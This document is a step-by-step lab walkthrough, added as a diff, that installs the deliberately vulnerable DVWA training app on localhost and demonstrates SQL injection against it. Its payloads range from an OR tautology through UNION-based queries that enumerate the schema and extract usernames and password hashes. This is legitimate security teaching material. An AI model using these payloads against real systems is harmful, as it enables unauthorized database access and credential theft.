@@ -1,0 +1,54 @@
+Step 1: Install DVWA 
+sudo apt update 
+sudo apt install dvwa –y
+Step 2: Start Required Services 
+sudo service apache2 start 
+sudo service mysql start
+Step 3: Configure DVWA 
+Edit config file: 
+sudo nano /etc/dvwa/config.inc.php 
+Ensure: 
+$_DVWA['db_password'] = ''; 
+Save and exit.
+Step 4: Open DVWA in Browser(Firefox) 
+http://127.0.0.1/dvwa 
+ Login: 
+o Username: admin 
+o Password: password 
+ Click Create / Reset Database
+Step 5: Set Security Level 
+ Go to DVWA Security 
+ Set Security Level = Low 
+ Click Submit
+4. SQL Injection Attack on DVWA 
+Step 6: Navigate to SQL Injection Module 
+DVWA → Vulnerabilities → SQL Injection 
+You will see an input box asking for User ID.
+enter:
+1
+1' OR '1'='1 
+6. SQL Injection – Database Enumeration 
+Step 9: Find Number of Columns 
+1' ORDER BY 1-- - 
+1' ORDER BY 2-- - 
+1' ORDER BY 3-- - 
+Stop when error occurs    Last successful number = total columns 
+
+Step 10: UNION-Based Injection 
+1' UNION SELECT 1,2-- - 
+
+Step 11: Extract Database Name 
+1' UNION SELECT database(),2-- - 
+Step 12: Extract Table Names 
+1' UNION SELECT table_name,2  
+FROM information_schema.tables  
+WHERE table_schema=database()-- - 
+
+Step 13: Extract Column Names 
+1' UNION SELECT column_name,2  
+FROM information_schema.columns  
+WHERE table_name='users'-- -
+Step 14: Extract Username & Password 
+1' UNION SELECT user,password FROM users-- - 
+ Passwords may appear as hashes.
+
